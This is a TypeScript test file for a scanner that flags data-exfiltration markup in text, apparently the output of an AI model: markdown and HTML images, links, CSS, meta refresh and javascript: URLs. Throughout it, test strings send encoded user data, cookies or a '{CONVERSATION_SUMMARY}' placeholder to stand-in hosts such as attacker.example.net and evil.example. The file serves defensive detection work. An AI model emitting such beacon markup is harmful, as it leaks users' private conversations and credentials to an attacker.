import { describe, expect, it } from "vitest";
import {
  detectExfiltration,
  type ExfiltrationOptions,
  isAllowedHost,
} from "../output/exfiltration";
import type { OutputFinding } from "../output/types";

function scan(text: string, options?: ExfiltrationOptions): OutputFinding[] {
  return detectExfiltration(text, options);
}

function summary(text: string, options?: ExfiltrationOptions): string[] {
  return scan(text, options).map((f) => `${f.kind}:${f.severity}`);
}

const leaked = encodeURIComponent(
  "User Jane Smith asked about the Q3 acquisition of Northwind and her password is hunter22"
);

describe("markdown images", () => {
  it("flags the classic exfiltration image as critical and spans the whole element", () => {
    const image = `![loading](https://attacker.example.net/log?q=${leaked})`;
    const text = `Here is your summary.\n\n${image}\n`;
    const [finding] = scan(text);
    expect(finding.kind).toBe("markdown_image");
    expect(finding.severity).toBe("critical");
    expect(text.slice(finding.start, finding.end)).toBe(image);
    expect(finding.preview).toBe("https://attacker.example.net/log?…");
    expect(finding.preview).not.toContain("hunter22");
  });

  it("flags any image from a non-allowlisted host as high (a beacon)", () => {
    expect(summary("![chart](https://cdn.evil.example/chart.png)")).toEqual([
      "markdown_image:high",
    ]);
  });

  it("does not flag allowlisted images, and can stop flagging data-free images", () => {
    const text = "![logo](https://assets.acme.dev/logo.png)";
    expect(scan(text, { allowedDomains: [".acme.dev"] })).toEqual([]);
    expect(
      scan("![x](https://cdn.other.dev/x.png)", { blockAllImages: false })
    ).toEqual([]);
    const exfil = `![x](https://cdn.other.dev/x.png?d=${leaked})`;
    expect(summary(exfil, { blockAllImages: false })).toEqual([
      "markdown_image:critical",
    ]);
  });

  it("handles whitespace and newline tricks between ] and (", () => {
    expect(summary("![a]\n(https://evil.example/p.png)")).toEqual([
      "markdown_image:high",
    ]);
    expect(summary("![a] (https://evil.example/p.png)")).toEqual([
      "markdown_image:high",
    ]);
    expect(summary("![a](\n  https://evil.example/p.png\n)")).toEqual([
      "markdown_image:high",
    ]);
  });

  it("handles protocol-relative, backslash, uppercase, angle-bracket, and titled destinations", () => {
    for (const destination of [
      "//evil.example/x.png",
      "\\\\evil.example/x.png",
      "HTTPS://EVIL.EXAMPLE/x.png",
      "https:\\\\evil.example/x.png",
      "<https://evil.example/x y.png>",
      'https://evil.example/x.png "title"',
    ]) {
      const findings = scan(`![a](${destination})`);
      expect(findings, destination).toHaveLength(1);
      expect(findings[0].preview.startsWith("https://evil.example")).toBe(true);
    }
  });

  it("handles nested brackets in alt text", () => {
    expect(summary("![a [nested] alt](https://evil.example/p.png)")).toEqual([
      "markdown_image:high",
    ]);
  });

  it("resolves reference-style images", () => {
    const text = `Result: ![status][s]\n\n[s]: https://evil.example/s.png?d=${leaked}`;
    const [finding] = scan(text);
    expect(finding.kind).toBe("markdown_image");
    expect(finding.severity).toBe("critical");
    expect(
      text
        .slice(finding.start, finding.end)
        .startsWith("https://evil.example/s.png")
    ).toBe(true);
  });

  it("ignores unused reference definitions and data: URIs", () => {
    expect(scan("[unused]: https://evil.example/x.png")).toEqual([]);
    expect(
      scan(
        "![inline](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==)"
      )
    ).toEqual([]);
  });

  it("punycodes internationalized and look-alike hosts", () => {
    const [finding] = scan("![x](https://аpple.com/a.png)");
    expect(finding.preview.startsWith("https://xn--")).toBe(true);
    expect(isAllowedHost("аpple.com", ["apple.com"])).toBe(false);
  });

  it("detects DNS exfiltration in a subdomain label", () => {
    const text =
      "![x](https://4a6f686e20446f652073736e3a203132332d34352d36373839.attacker.example/p.png)";
    expect(summary(text)).toEqual(["markdown_image:critical"]);
    expect(scan(text)[0].preview).toContain("4a6f686e…");
  });
});

describe("markdown links", () => {
  it("ignores ordinary documentation links", () => {
    const text = [
      "See [the Fetch API docs](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch),",
      "[README.md](https://github.com/acme/repo/blob/main/README.md), and",
      "[Stripe](https://stripe.com/docs/api?lang=node#authentication).",
      "Search: https://www.google.com/search?q=how+to+use+fetch",
    ].join(" ");
    expect(scan(text)).toEqual([]);
  });

  it("flags links that carry data", () => {
    const encoded = btoa(
      "Conversation summary: the user is planning layoffs in March"
    );
    expect(
      summary(`[click here](https://evil.example/c?d=${encoded})`)
    ).toEqual(["markdown_link:high"]);
    expect(
      summary(
        `[continue](https://evil.example/c?session=${"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6".split("").reverse().join("")})`
      )
    ).toEqual(["markdown_link:medium"]);
  });

  it("flags links whose text shows a different domain", () => {
    expect(summary("[www.google.com](https://login.evil.example/)")).toEqual([
      "markdown_link:medium",
    ]);
    expect(scan("[docs.python.org](https://docs.python.org/3/)")).toEqual([]);
  });

  it("flags every non-allowlisted link with flagLinks: 'all' and none with 'none'", () => {
    const text =
      "[docs](https://docs.other.dev/) and [home](https://acme.dev/)";
    expect(
      summary(text, { flagLinks: "all", allowedDomains: ["acme.dev"] })
    ).toEqual(["markdown_link:low"]);
    const exfil = `[x](https://evil.example/?d=${leaked})`;
    expect(scan(exfil, { flagLinks: "none" })).toEqual([]);
  });

  it("flags javascript: URLs", () => {
    expect(
      summary("[open](javascript:fetch('//e.example/?c='+document.cookie))")
    ).toEqual(["script_url:high"]);
    expect(summary("[open]( JaVaScRiPt:alert(1))")).toEqual([
      "script_url:high",
    ]);
  });

  it("keeps both findings for an image wrapped in a link", () => {
    const text = `[![badge](https://img.example/b.svg)](https://evil.example/?d=${leaked})`;
    expect(summary(text).sort()).toEqual([
      "markdown_image:high",
      "markdown_link:high",
    ]);
  });
});

describe("HTML", () => {
  it("flags img, iframe, script, link, video, and audio sources", () => {
    const text = [
      `<img src="https://evil.example/a.png?data=${btoa("secret notes from the meeting today")}">`,
      "<iframe src='https://evil.example/frame'></iframe>",
      "<script src=//cdn.evil.example/x.js></script>",
      '<link rel="stylesheet" href="https://evil.example/s.css">',
      '<video poster="https://evil.example/p.jpg"></video>',
      '<audio src="https://evil.example/a.mp3"></audio>',
    ].join("\n");
    expect(summary(text)).toEqual([
      "html_image:critical",
      "html_resource:high",
      "html_resource:high",
      "html_resource:high",
      "html_resource:high",
      "html_resource:high",
    ]);
  });

  it("decodes entities, ignores case, and strips newlines in attribute URLs", () => {
    expect(summary('<IMG SRC="https&#58;//evil.example/x.png">')).toEqual([
      "html_image:high",
    ]);
    expect(summary('<img src="htt\nps://evil.example/x.png">')).toEqual([
      "html_image:high",
    ]);
    expect(
      summary('<img alt="a > b" src="https://evil.example/x.png">')
    ).toEqual(["html_image:high"]);
  });

  it("reads srcset candidates", () => {
    expect(
      summary(
        '<img srcset="https://ok.acme.dev/1x.png 1x, https://evil.example/2x.png 2x">',
        { allowedDomains: [".acme.dev"] }
      )
    ).toEqual(["html_image:high"]);
  });

  it("flags event handlers, meta refresh, base, and forms", () => {
    expect(summary("<img src=x onerror=\"fetch('//evil.example')\">")).toEqual([
      "html_event_handler:high",
    ]);
    expect(
      summary(
        `<meta http-equiv="refresh" content="0; url=https://evil.example/?d=${leaked}">`
      )
    ).toEqual(["meta_refresh:critical"]);
    expect(summary('<base href="https://evil.example/">')).toEqual([
      "html_base:high",
    ]);
    expect(
      summary(
        '<form action="https://evil.example/collect"><input name="p"></form>'
      )
    ).toEqual(["html_form:medium"]);
  });

  it("flags anchors whose text shows a different domain", () => {
    expect(
      summary(
        '<a href="https://evil.example/login">https://github.com/login</a>'
      )
    ).toEqual(["html_link:medium"]);
  });
});

describe("CSS", () => {
  it("flags url() and @import", () => {
    expect(
      summary("<div style=\"background:url('https://evil.example/bg.png')\">")
    ).toEqual(["css_url:high"]);
    expect(
      summary('<style>@import "https://evil.example/x.css";</style>')
    ).toEqual(["css_url:high"]);
  });
});

describe("bare URLs", () => {
  it("flags URLs that carry data and ignores clean ones", () => {
    const text = `Open https://collector.evil.example/p?email=jane.smith%40acme-corp.io&session=${"f3a9c2e41b0d6a8".repeat(2)}xyz now. Docs: https://docs.acme.dev/start.`;
    const findings = scan(text);
    expect(findings.map((f) => f.kind)).toEqual(["url_data"]);
    expect(findings[0].severity).toBe("high");
    expect(text.slice(findings[0].start, findings[0].end).endsWith("xyz")).toBe(
      true
    );
  });

  it("trims trailing punctuation and unbalanced brackets", () => {
    const text = `(see https://evil.example/log?d=${leaked}).`;
    const [finding] = scan(text);
    expect(text.slice(finding.start, finding.end).endsWith(leaked)).toBe(true);
  });

  it("does not report the same URL twice when it is inside a markdown link", () => {
    expect(scan(`[x](https://evil.example/?d=${leaked})`)).toHaveLength(1);
  });

  it("flags template placeholders left in an injected URL", () => {
    expect(
      summary("![img](https://evil.example/log?data={CONVERSATION_SUMMARY})")
    ).toEqual(["markdown_image:critical"]);
  });
});

describe("code", () => {
  it("downgrades examples inside inline code and fenced blocks to low", () => {
    const inline =
      "Use `![alt](https://example.com/image.png)` to embed an image.";
    const fenced =
      '```md\n![alt](https://example.com/image.png)\n<img src="https://example.com/a.png">\n```';
    for (const text of [inline, fenced]) {
      const findings = scan(text);
      expect(findings.length, text).toBeGreaterThan(0);
      expect(
        findings.every((f) => f.severity === "low"),
        text
      ).toBe(true);
    }
  });

  it("still flags images after a closed code block", () => {
    const text = "```\ncode\n```\n\n![x](https://evil.example/x.png)";
    expect(summary(text)).toEqual(["markdown_image:high"]);
  });
});

describe("isAllowedHost", () => {
  it("matches exact hosts and suffixes", () => {
    expect(isAllowedHost("cdn.acme.dev", ["cdn.acme.dev"])).toBe(true);
    expect(isAllowedHost("img.cdn.acme.dev", ["cdn.acme.dev"])).toBe(false);
    expect(isAllowedHost("img.acme.dev", [".acme.dev"])).toBe(true);
    expect(isAllowedHost("acme.dev", [".acme.dev"])).toBe(true);
    expect(isAllowedHost("img.acme.dev", ["*.acme.dev"])).toBe(true);
    expect(isAllowedHost("acme.dev.evil.example", [".acme.dev"])).toBe(false);
    expect(isAllowedHost("notacme.dev", [".acme.dev"])).toBe(false);
  });

  it("normalizes case, ports, trailing dots, URLs, and IDN", () => {
    expect(isAllowedHost("CDN.ACME.DEV.", ["cdn.acme.dev"])).toBe(true);
    expect(isAllowedHost("cdn.acme.dev:8443", ["https://cdn.acme.dev/"])).toBe(
      true
    );
    expect(isAllowedHost("xn--bcher-kva.example", ["bücher.example"])).toBe(
      true
    );
    expect(isAllowedHost("bücher.example", ["xn--bcher-kva.example"])).toBe(
      true
    );
    expect(isAllowedHost("", ["acme.dev"])).toBe(false);
    expect(isAllowedHost("acme.dev")).toBe(false);
  });

  it("is applied to URLs with userinfo tricks", () => {
    expect(
      scan("![x](https://acme.dev@evil.example/x.png)", {
        allowedDomains: ["acme.dev"],
      })
    ).toHaveLength(1);
    expect(
      scan("![x](https://evil.example@acme.dev/x.png)", {
        allowedDomains: ["acme.dev"],
      })
    ).toEqual([]);
  });
});

describe("general", () => {
  it("returns [] quickly for text without URLs", () => {
    expect(scan("Plain text with no links at all.")).toEqual([]);
    expect(scan("")).toEqual([]);
    expect(scan(undefined as unknown as string)).toEqual([]);
  });

  it("respects minConfidence", () => {
    const text = "Use `![alt](https://example.com/image.png)` to embed.";
    expect(scan(text, { minConfidence: 0.5 })).toEqual([]);
  });

  it("returns findings sorted by start", () => {
    const text =
      "![b](https://b.example/b.png) text ![a](https://a.example/a.png)";
    const starts = scan(text).map((f) => f.start);
    expect(starts).toEqual([...starts].sort((x, y) => x - y));
  });
});
